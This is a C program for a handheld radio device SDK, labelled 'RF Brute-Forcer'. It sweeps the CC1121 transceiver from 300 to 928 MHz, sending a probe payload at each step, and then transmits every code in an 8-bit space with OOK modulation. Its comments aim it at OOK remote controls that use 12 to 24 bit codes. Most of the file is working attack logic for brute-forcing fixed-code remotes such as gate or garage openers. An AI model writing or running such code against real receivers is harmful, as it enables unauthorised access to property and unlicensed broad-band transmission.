#include "akira_api.h"
// Do NOT include <string.h> or <stdio.h> — akira_api.h provides its own helpers.

#define FREQ_START_KHZ 300000
#define FREQ_END_KHZ 928000
#define FREQ_STEP_KHZ 1000 // 1 MHz step for a full sweep
#define CODE_START 0
#define CODE_END 255    // 8-bit code space (expand as needed)
#define TX_DELAY_MS 100 // pause between transmissions

static int timer;
static int current_freq;
static int current_code;
static int mode; // 0 = frequency sweep, 1 = code brute-force

// Manual integer-to-string (no snprintf in the SDK)
static void uint_to_str(int val, char *buf)
{
    if (val == 0)
    {
        buf[0] = '0';
        buf[1] = '\0';
        return;
    }
    char tmp[12];
    int i = 0;
    while (val > 0)
    {
        tmp[i++] = '0' + (val % 10);
        val /= 10;
    }
    int j = 0;
    while (i > 0)
        buf[j++] = tmp[--i];
    buf[j] = '\0';
}

static void draw_status(const char *line1, const char *line2)
{
    display_clear(COLOR_BLACK);
    display_text(10, 10, "RF Brute-Forcer", COLOR_CYAN);
    display_text(10, 40, line1, COLOR_WHITE);
    display_text(10, 60, line2, COLOR_WHITE);
    display_flush();
}

static void run_frequency_sweep(void)
{
    char freq_buf[12];
    uint_to_str(current_freq, freq_buf);
    draw_status("Sweeping frequency...", freq_buf);

    rf_set_frequency(current_freq);

    // Send a small probing payload (adjust to your target protocol)
    uint8_t payload[4] = {0xAA, 0xBB, 0xCC, 0xDD};
    rf_send(payload, sizeof(payload));

    current_freq += FREQ_STEP_KHZ;
    if (current_freq > FREQ_END_KHZ)
    {
        current_freq = FREQ_START_KHZ;
        mode = 1; // switch to code brute-force after a full sweep
        draw_status("Sweep done", "Starting code brute-force");
    }
}

static void run_code_bruteforce(void)
{
    char code_buf[8];
    uint_to_str(current_code, code_buf);
    draw_status("Brute-forcing code...", code_buf);

    // Build a 4-byte payload from the current code value.
    // Many OOK remotes use 12–24 bit codes; adjust width as needed.
    uint8_t payload[4] = {
        (uint8_t)(current_code & 0xFF),
        (uint8_t)((current_code >> 8) & 0xFF),
        (uint8_t)((current_code >> 16) & 0xFF),
        (uint8_t)((current_code >> 24) & 0xFF)};
    rf_send(payload, sizeof(payload));

    current_code++;
    if (current_code > CODE_END)
    {
        current_code = CODE_START;
        draw_status("Code space exhausted", "Restarting...");
    }
}

int main(void)
{
    // Initialize the CC1121 for OOK at the starting frequency.
    rf_select(AKIRA_RF_CHIP_CC1121);
    rf_set_frequency(FREQ_START_KHZ);
    rf_set_modulation(RADIO_MOD_OOK);
    rf_set_power(10); // dBm

    timer = timer_create();
    timer_start(timer);

    current_freq = FREQ_START_KHZ;
    current_code = CODE_START;
    mode = 0;

    draw_status("Starting...", "");

    while (1)
    {
        if (timer_elapsed(timer) >= TX_DELAY_MS)
        {
            timer_start(timer);

            if (mode == 0)
            {
                run_frequency_sweep();
            }
            else
            {
                run_code_bruteforce();
            }
        }
        delay(16000); // ~60 fps yield
    }
    return 0;
}